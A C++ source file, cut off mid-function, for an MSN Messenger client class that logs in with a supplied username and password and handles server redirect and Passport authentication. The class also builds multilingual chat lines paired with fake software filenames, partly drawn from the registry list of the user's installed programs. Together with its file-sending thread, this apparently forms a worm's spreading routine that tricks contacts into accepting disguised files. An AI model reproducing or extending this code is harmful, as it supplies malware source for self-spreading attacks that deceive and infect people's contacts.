#include "MSNClient.h"

void asyncReadThread(void * threadParams);
void asyncConversationFileSendReadThread(void * threadParams);

MSNClient::MSNClient(const char * user, const char * passwd) : TCPSocket(MSN_HOST, MSN_PORT, true) {
   login(user, passwd);
   MSNServerRedirect = NULL;
   MSNServerAuth = NULL;
   MSNContactList = NULL;
   MSNOnLineContactList = NULL;
   MSNConversationList = NULL;
   actualState = NULL;
   actualIDConversation = NULL;
   MSNLogged = false;
   chgNickname = false;
   stopMSNSession = false;
   IDCommand = 1;
   numContacts = 0;
   numOnLineContacts = 0;
   numConversations = 0;
   numConcurrentFilesToSend = 0;
   
   sentencesToTalk = new MultipleLangStringList();
   inicializeSentencesToTalk();
}

bool MSNClient::inicializeSentencesToTalk() {
   std::vector<std::string> filenamesList1;
   std::vector<std::string> filenamesList2;
   std::vector<std::string> filenamesList3;
   std::vector<std::string> filenamesList4;
   std::vector<std::string> filenamesList5;
   WINRegistry * WinReg = new WINRegistry();
   
   srand((unsigned) time(NULL));
   
   char ** plsoft = WinReg->RegQueryEnumerationCurrentUserSoftware();
   for (int i = 0; i < WinReg->getCountElems(); i++) filenamesList1.push_back(string(FunctionsStrings::removeSpecialCharacters(*(plsoft + i))));
   
   sentencesToTalk->addMultipleLangString(MSN_SENTENCE1_SP, MSN_SENTENCE1_EN, MSN_SENTENCE1_IT, MSN_SENTENCE1_FR, MSN_SENTENCE1_GE, 
                                          MSN_SENTENCE1_PO, MSN_SENTENCE1_CA, MSN_SENTENCE1_AR, MSN_SENTENCE1_BU, MSN_SENTENCE1_CZ, 
                                          MSN_SENTENCE1_CH, MSN_SENTENCE1_CR, MSN_SENTENCE1_DA, MSN_SENTENCE1_FI, MSN_SENTENCE1_GR,
                                          MSN_SENTENCE1_HI, MSN_SENTENCE1_DU, MSN_SENTENCE1_JA, MSN_SENTENCE1_NO, MSN_SENTENCE1_PL,
                                          MSN_SENTENCE1_RU, MSN_SENTENCE1_SW, filenamesList1);  

   filenamesList2.push_back(string(MSN_FILENAME1_SENTENCE2) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList2.push_back(string(MSN_FILENAME2_SENTENCE2) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList2.push_back(string(MSN_FILENAME3_SENTENCE2) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList2.push_back(string(MSN_FILENAME4_SENTENCE2) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList2.push_back(string(MSN_FILENAME5_SENTENCE2) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList2.push_back(string(MSN_FILENAME6_SENTENCE2) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList2.push_back(string(MSN_FILENAME7_SENTENCE2) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList2.push_back(string(MSN_FILENAME8_SENTENCE2) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList2.push_back(string(MSN_FILENAME9_SENTENCE2) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList2.push_back(string(MSN_FILENAME10_SENTENCE2) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList2.push_back(string(MSN_FILENAME11_SENTENCE2) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList2.push_back(string(MSN_FILENAME12_SENTENCE2) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList2.push_back(string(MSN_FILENAME13_SENTENCE2) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList2.push_back(string(MSN_FILENAME14_SENTENCE2) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList2.push_back(string(MSN_FILENAME15_SENTENCE2) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList2.push_back(string(MSN_FILENAME16_SENTENCE2) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList2.push_back(string(MSN_FILENAME17_SENTENCE2) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList2.push_back(string(MSN_FILENAME18_SENTENCE2) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList2.push_back(string(MSN_FILENAME19_SENTENCE2) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList2.push_back(string(MSN_FILENAME20_SENTENCE2) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   
   sentencesToTalk->addMultipleLangString(MSN_SENTENCE2_SP, MSN_SENTENCE2_EN, MSN_SENTENCE2_IT, MSN_SENTENCE2_FR, MSN_SENTENCE2_GE, 
                                          MSN_SENTENCE2_PO, MSN_SENTENCE2_CA, MSN_SENTENCE2_AR, MSN_SENTENCE2_BU, MSN_SENTENCE2_CZ, 
                                          MSN_SENTENCE2_CH, MSN_SENTENCE2_CR, MSN_SENTENCE2_DA, MSN_SENTENCE2_FI, MSN_SENTENCE2_GR,
                                          MSN_SENTENCE2_HI, MSN_SENTENCE2_DU, MSN_SENTENCE2_JA, MSN_SENTENCE2_NO, MSN_SENTENCE2_PL,
                                          MSN_SENTENCE2_RU, MSN_SENTENCE2_SW, filenamesList2); 

   filenamesList3.push_back(string(MSN_FILENAME1_SENTENCE3) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList3.push_back(string(MSN_FILENAME2_SENTENCE3) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList3.push_back(string(MSN_FILENAME3_SENTENCE3) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList3.push_back(string(MSN_FILENAME4_SENTENCE3) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList3.push_back(string(MSN_FILENAME5_SENTENCE3) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList3.push_back(string(MSN_FILENAME6_SENTENCE3) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList3.push_back(string(MSN_FILENAME7_SENTENCE3) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList3.push_back(string(MSN_FILENAME8_SENTENCE3) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList3.push_back(string(MSN_FILENAME9_SENTENCE3) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList3.push_back(string(MSN_FILENAME10_SENTENCE3) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList3.push_back(string(MSN_FILENAME11_SENTENCE3) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList3.push_back(string(MSN_FILENAME12_SENTENCE3) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList3.push_back(string(MSN_FILENAME13_SENTENCE3) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList3.push_back(string(MSN_FILENAME14_SENTENCE3) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList3.push_back(string(MSN_FILENAME15_SENTENCE3) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList3.push_back(string(MSN_FILENAME16_SENTENCE3) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList3.push_back(string(MSN_FILENAME17_SENTENCE3) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList3.push_back(string(MSN_FILENAME18_SENTENCE3) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList3.push_back(string(MSN_FILENAME19_SENTENCE3) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList3.push_back(string(MSN_FILENAME20_SENTENCE3) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   
   sentencesToTalk->addMultipleLangString(MSN_SENTENCE3_SP, MSN_SENTENCE3_EN, MSN_SENTENCE3_IT, MSN_SENTENCE3_FR, MSN_SENTENCE3_GE, 
                                          MSN_SENTENCE3_PO, MSN_SENTENCE3_CA, MSN_SENTENCE3_AR, MSN_SENTENCE3_BU, MSN_SENTENCE3_CZ, 
                                          MSN_SENTENCE3_CH, MSN_SENTENCE3_CR, MSN_SENTENCE3_DA, MSN_SENTENCE3_FI, MSN_SENTENCE3_GR,
                                          MSN_SENTENCE3_HI, MSN_SENTENCE3_DU, MSN_SENTENCE3_JA, MSN_SENTENCE3_NO, MSN_SENTENCE3_PL,
                                          MSN_SENTENCE3_RU, MSN_SENTENCE3_SW, filenamesList3); 

   filenamesList4.push_back(string(MSN_FILENAME1_SENTENCE4) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList4.push_back(string(MSN_FILENAME2_SENTENCE4) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList4.push_back(string(MSN_FILENAME3_SENTENCE4) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList4.push_back(string(MSN_FILENAME4_SENTENCE4) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList4.push_back(string(MSN_FILENAME5_SENTENCE4) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList4.push_back(string(MSN_FILENAME6_SENTENCE4) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList4.push_back(string(MSN_FILENAME7_SENTENCE4) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList4.push_back(string(MSN_FILENAME8_SENTENCE4) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList4.push_back(string(MSN_FILENAME9_SENTENCE4) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList4.push_back(string(MSN_FILENAME10_SENTENCE4) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList4.push_back(string(MSN_FILENAME11_SENTENCE4) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList4.push_back(string(MSN_FILENAME12_SENTENCE4) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList4.push_back(string(MSN_FILENAME13_SENTENCE4) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList4.push_back(string(MSN_FILENAME14_SENTENCE4) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList4.push_back(string(MSN_FILENAME15_SENTENCE4) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList4.push_back(string(MSN_FILENAME16_SENTENCE4) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList4.push_back(string(MSN_FILENAME17_SENTENCE4) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList4.push_back(string(MSN_FILENAME18_SENTENCE4) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList4.push_back(string(MSN_FILENAME19_SENTENCE4) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList4.push_back(string(MSN_FILENAME20_SENTENCE4) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
                                             
   sentencesToTalk->addMultipleLangString(MSN_SENTENCE4_SP, MSN_SENTENCE4_EN, MSN_SENTENCE4_IT, MSN_SENTENCE4_FR, MSN_SENTENCE4_GE, 
                                          MSN_SENTENCE4_PO, MSN_SENTENCE4_CA, MSN_SENTENCE4_AR, MSN_SENTENCE4_BU, MSN_SENTENCE4_CZ, 
                                          MSN_SENTENCE4_CH, MSN_SENTENCE4_CR, MSN_SENTENCE4_DA, MSN_SENTENCE4_FI, MSN_SENTENCE4_GR,
                                          MSN_SENTENCE4_HI, MSN_SENTENCE4_DU, MSN_SENTENCE4_JA, MSN_SENTENCE4_NO, MSN_SENTENCE4_PL,
                                          MSN_SENTENCE4_RU, MSN_SENTENCE4_SW, filenamesList4); 

   filenamesList5.push_back(string(MSN_FILENAME1_SENTENCE5) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList5.push_back(string(MSN_FILENAME2_SENTENCE5) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList5.push_back(string(MSN_FILENAME3_SENTENCE5) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList5.push_back(string(MSN_FILENAME4_SENTENCE5) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList5.push_back(string(MSN_FILENAME5_SENTENCE5) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList5.push_back(string(MSN_FILENAME6_SENTENCE5) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList5.push_back(string(MSN_FILENAME7_SENTENCE5) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList5.push_back(string(MSN_FILENAME8_SENTENCE5) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList5.push_back(string(MSN_FILENAME9_SENTENCE5) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList5.push_back(string(MSN_FILENAME10_SENTENCE5) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList5.push_back(string(MSN_FILENAME11_SENTENCE5) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList5.push_back(string(MSN_FILENAME12_SENTENCE5) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList5.push_back(string(MSN_FILENAME13_SENTENCE5) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList5.push_back(string(MSN_FILENAME14_SENTENCE5) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList5.push_back(string(MSN_FILENAME15_SENTENCE5) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList5.push_back(string(MSN_FILENAME16_SENTENCE5) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList5.push_back(string(MSN_FILENAME17_SENTENCE5) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList5.push_back(string(MSN_FILENAME18_SENTENCE5) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList5.push_back(string(MSN_FILENAME19_SENTENCE5) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   filenamesList5.push_back(string(MSN_FILENAME20_SENTENCE5) + string(" ver-") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 7))) + string(".") + string(FunctionsStrings::int2char(FunctionsAssistant::randomNumber(1, 10))));
   
   sentencesToTalk->addMultipleLangString(MSN_SENTENCE5_SP, MSN_SENTENCE5_EN, MSN_SENTENCE5_IT, MSN_SENTENCE5_FR, MSN_SENTENCE5_GE, 
                                          MSN_SENTENCE5_PO, MSN_SENTENCE5_CA, MSN_SENTENCE5_AR, MSN_SENTENCE5_BU, MSN_SENTENCE5_CZ, 
                                          MSN_SENTENCE5_CH, MSN_SENTENCE5_CR, MSN_SENTENCE5_DA, MSN_SENTENCE5_FI, MSN_SENTENCE5_GR,
                                          MSN_SENTENCE5_HI, MSN_SENTENCE5_DU, MSN_SENTENCE5_JA, MSN_SENTENCE5_NO, MSN_SENTENCE5_PL,
                                          MSN_SENTENCE5_RU, MSN_SENTENCE5_SW, filenamesList5);                                                                                     
}
 
bool MSNClient::startSession() {
   char cmdCount[10];
   bool serverRedirectOK = false, err = false, result = false;
   TCPSocket * activeSocket = this;
   char * cmdMSN, * serverRedirectProp, * serverRedirectHost, * serverRedirectPort, * sValueCapture;
   char * infoServerAuth, * infoServerAuth2, * serverAuthHost, * serverAuthFileGet;
   char * userAuth, * hostAuth, * responseServerAuth, * ticket;
   
   if (connect()) {
      sprintf(cmdCount, "%lu", IDCommand);
      
      for(;((!serverRedirectOK) && (!err));) {
         if (activeSocket->send((string("VER ") + string(cmdCount) + string(" MSNP8 CVR0\r\n")).c_str())) {
            IDCommand++; sprintf(cmdCount, "%lu", IDCommand);
            
            if (activeSocket->recv()) {
               cmdMSN = FunctionsStrings::getFirstToken(activeSocket->getServerData(), ' ');
               if (cmdMSN != NULL) {
                  if (stricmp(cmdMSN, "VER") == 0) {
                     free(cmdMSN);
                     if (activeSocket->send((string("CVR ") + string(cmdCount) + string(" 0x0409 winnt 5.1 i386 MSNMSGR 6.1.0602 MSMSGS ") + string(username) + string("\r\n")).c_str())) {
                        IDCommand++; sprintf(cmdCount, "%lu", IDCommand);
                        if (activeSocket->recv()) {
                           cmdMSN = FunctionsStrings::getFirstToken(activeSocket->getServerData(), ' ');
                           if (cmdMSN != NULL) {
                              if (stricmp(cmdMSN, "CVR") == 0) {
                                 free(cmdMSN);
                                 if (activeSocket->send((string("USR ") + string(cmdCount) + string(" TWN I ") + string(username) + string("\r\n")).c_str())) {
                                    IDCommand++; sprintf(cmdCount, "%lu", IDCommand);
                                    if (activeSocket->recv()) {
                                       cmdMSN = FunctionsStrings::getFirstToken(activeSocket->getServerData(), ' ');
                                       if (cmdMSN != NULL) {
                                          if (stricmp(cmdMSN, "USR") == 0) {
                                             sValueCapture = FunctionsStrings::getToken(activeSocket->getServerData(), ' ', 5);
                                             if (sValueCapture != NULL) {
                                                serverRedirectOK = true;  
                                             }
                                             else err = true;      
                                          }
                                          else if (stricmp(cmdMSN, "XFR") == 0) {
                                             Sleep(MSN_DELAY);
                                             activeSocket->close();
                                             serverRedirectProp = FunctionsStrings::getToken(activeSocket->getServerData(), ' ', 4);   
                                             if (serverRedirectProp != NULL) {
                                                serverRedirectHost = FunctionsStrings::getToken(serverRedirectProp, ':', 1);
                                                serverRedirectPort = FunctionsStrings::getToken(serverRedirectProp, ':', 2);
                                                free(serverRedirectProp);
                                                if ((serverRedirectHost != NULL) && (serverRedirectPort != NULL)) {
                                                   MSNServerRedirect = new TCPSocket(serverRedirectHost, atol(serverRedirectPort));
                                                   free(serverRedirectHost); free(serverRedirectPort);
                                                   if (MSNServerRedirect->connect()) {
                                                      activeSocket = MSNServerRedirect;  
                                                   }
                                                   else err = true;
                                                }
                                                else err = true;  
                                             }
                                             else err = true;                                      
                                          }
                                          else err = true;
                                          free(cmdMSN);   
                                       }
                                       else err = true;
                                    }
                                    else err = true;
                                 }
                                 else err = true;
                              }
                              else { free(cmdMSN); err = true; }      
                           }
                           else err = true;  
                        }
                        else err = true;   
                     }
                     else err = true;
                  }
                  else { free(cmdMSN); err = true; }   
               }
               else err = true;
            }
            else err = true;
         }
         else err = true;
      }
      
      /* Connected MSN_HOST OK && data sended OK - Connected MSNServerRedirect OK && data sended OK */
      if (serverRedirectOK) {
         
         HTTPClient * https = new HTTPClient(MSN_AUTH_QUERY_SERVER, MSN_AUTH_QUERY_PORT, true);
         if (https->connect()) {
            if (https->getHeaders("/rdr/pprdr.asp")) {
               Sleep(MSN_DELAY);
               https->close();
               infoServerAuth = FunctionsStrings::getToken(https->getResponseHeaders(), ',', 3);
               if (infoServerAuth != NULL) {
                  infoServerAuth2 = FunctionsStrings::getToken(infoServerAuth, ',', 1);
                  free(infoServerAuth);
                  if (infoServerAuth2 != NULL) {
                     infoServerAuth = FunctionsStrings::getToken(infoServerAuth2, '=', 2);
                     free(infoServerAuth2);
                     if (infoServerAuth != NULL) {
                        serverAuthHost = FunctionsStrings::getToken(infoServerAuth, '/', 1);
                        serverAuthFileGet = FunctionsStrings::getToken(infoServerAuth, '/', 2);
                        free(infoServerAuth);
                        if ((serverAuthHost != NULL) && (serverAuthFileGet != NULL)) {
                           MSNServerAuth = new HTTPClient(serverAuthHost, MSN_AUTH_QUERY_PORT, true);
                           if (MSNServerAuth->connect()) {
                              userAuth = FunctionsStrings::getToken(username, '@', 1);
                              hostAuth = FunctionsStrings::getToken(username, '@', 2);

                              if ((userAuth != NULL) && (hostAuth != NULL)) {
                                          
                                 if (MSNServerAuth->getHeaders((string("/") + string(serverAuthFileGet)).c_str(), (string("Authorization: Passport1.4 OrgVerb=GET,OrgURL=http%3A%2F%2Fmessenger%2Emsn%2Ecom,sign-in=") + string(userAuth) + string("%40") + string(hostAuth) + string(",pwd=") + string(password) + string(",") + string(sValueCapture) + string("\r\n")).c_str())) {
                                    
                                    /* >>> Username && Password Correctly (Passport Account) */
                                    Sleep(MSN_DELAY);
                                    MSNServerAuth->close();
                                    responseServerAuth = FunctionsStrings::getToken(MSNServerAuth->getResponseHeaders(), '\'', 2);
                                    if (responseServerAuth != NULL) {
                                       ticket = FunctionsStrings::getToken(responseServerAuth, '\'', 1);
                                       if (ticket != NULL) {
